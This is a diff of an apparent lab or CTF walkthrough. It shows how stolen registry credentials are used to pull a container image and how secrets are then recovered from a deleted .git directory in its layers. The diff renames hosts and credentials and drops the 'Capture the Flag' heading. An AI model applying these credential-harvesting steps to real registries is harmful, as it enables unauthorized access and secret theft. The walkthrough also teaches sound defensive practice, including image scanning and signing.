@@ -2,7 +2,7 @@
 
 ## Scenario
 
-The attacker has obtained registry credentials from Attack #1 and can now access the container registry at `https://localhost:30000`. The organization has pushed a `recipe-api:v1.0` image to this registry.
+The attacker has obtained registry credentials from Attack #1 and can now access the container registry at `https://registry.sc.local:30443`. The organization has pushed a `recipe-api:v1.0` image to this registry.
 
 This guide demonstrates how to extract sensitive data from "deleted" files in container image layers.
 
@@ -32,20 +32,20 @@ Using the stolen registry credentials from Attack #1:
 
 ```bash
 # Login to the registry
-podman login localhost:30000 --tls-verify=false \
-  -u ctf-admin \
-  -p CTFRegistryPass123!
+podman login registry.sc.local:30443 --tls-verify=false \
+  -u sc-admin \
+  -p RegistryPass123!
 
 # List available images
-curl -k -u ctf-admin:CTFRegistryPass123! \
-  https://localhost:30000/v2/_catalog
+curl -k -u sc-admin:RegistryPass123! \
+  https://registry.sc.local:30443/v2/_catalog
 
 # Expected output:
 # {"repositories":["recipe-api"]}
 
 # Check available tags
-curl -k -u ctf-admin:CTFRegistryPass123! \
-  https://localhost:30000/v2/recipe-api/tags/list
+curl -k -u sc-admin:RegistryPass123! \
+  https://registry.sc.local:30443/v2/recipe-api/tags/list
 
 # Expected output:
 # {"name":"recipe-api","tags":["v1.0"]}
@@ -54,14 +54,14 @@ curl -k -u ctf-admin:CTFRegistryPass123! \
 ### Step 2: Pull the Image
 
 ```bash
-podman pull localhost:30000/recipe-api:v1.0 --tls-verify=false
+podman pull registry.sc.local:30443/recipe-api:v1.0 --tls-verify=false
 ```
 
 ### Step 3: Inspect Image Layers
 
 ```bash
 # View image history to see all layers
-podman history localhost:30000/recipe-api:v1.0
+podman history registry.sc.local:30443/recipe-api:v1.0
 
 # Look for suspicious commands like "rm -rf .git"
 ```
@@ -92,7 +92,7 @@ b6ad93049e15   5 minutes ago   RUN /bin/sh -c rm -rf .git # buildkit          0B
 sudo dnf install dive
 
 # Explore the image interactively
-dive localhost:30000/recipe-api:v1.0
+dive registry.sc.local:30443/recipe-api:v1.0
 
 # Navigate to the layer before "rm -rf .git"
 # Press Tab to switch between layers and file tree
@@ -103,7 +103,7 @@ dive localhost:30000/recipe-api:v1.0
 
 ```bash
 # Save the image as a tar archive
-podman save localhost:30000/recipe-api:v1.0 -o recipe-api.tar
+podman save registry.sc.local:30443/recipe-api:v1.0 -o recipe-api.tar
 
 # Extract the tar
 mkdir recipe-api-extracted
@@ -142,7 +142,7 @@ done
 go install github.com/GoogleContainerTools/container-diff/cmd/container-diff@latest
 
 # Analyze file system differences between layers
-container-diff analyze localhost:30000/recipe-api:v1.0 \
+container-diff analyze registry.sc.local:30443/recipe-api:v1.0 \
   --type=file \
   --json > analysis.json
 
@@ -157,7 +157,7 @@ Now that LAYER_DIR is set to the layer containing `.git`, extract and explore it
 ```bash
 cd /tmp
 # Save the image as a tar archive
-podman save localhost:30000/recipe-api:v1.0 -o recipe-api.tar
+podman save registry.sc.local:30443/recipe-api:v1.0 -o recipe-api.tar
 
 # Extract the tar
 mkdir recipe-api-extracted
@@ -207,7 +207,7 @@ git checkout cb0d66f
 cat .env.production
 ```
 
-### Step 7: Capture the Flag
+### Step 7: deep dive
 
 The `.env.production` file contains:
 
@@ -225,8 +225,8 @@ SENDGRID_API_KEY=SG.xYz789AbCdEf123456.gHiJkLmNoPqRsTuVwXyZ123456789
 
 # Registry Credentials (from Attack #1)
 REGISTRY_URL=https://registry.registry.svc.cluster.local:5000
-REGISTRY_USERNAME=ctf-admin
-REGISTRY_PASSWORD=CTFRegistryPass123!
+REGISTRY_USERNAME=sc-admin
+REGISTRY_PASSWORD=RegistryPass123!
 
 # Next Challenge Flag
 # FLAG{l4y3r_l34k_g1t_h1st0ry:NEXT:g1t0ps_c0mpr0m1s3}
@@ -301,10 +301,10 @@ secrets/
 2. **Scan images for secrets**
    ```bash
    # Use Trivy
-   trivy image localhost:30000/recipe-api:v1.0
+   trivy image registry.sc.local:30443/recipe-api:v1.0
    
    # Use Grype
-   grype localhost:30000/recipe-api:v1.0
+   grype registry.sc.local:30443/recipe-api:v1.0
    ```
 
 3. **Minimize image layers**
@@ -326,7 +326,7 @@ secrets/
 5. **Implement image signing**
    ```bash
    # Sign images with Cosign
-   cosign sign localhost:30000/recipe-api:v1.0
+   cosign sign registry.sc.local:30443/recipe-api:v1.0
    ```
 
 ## Detection Methods
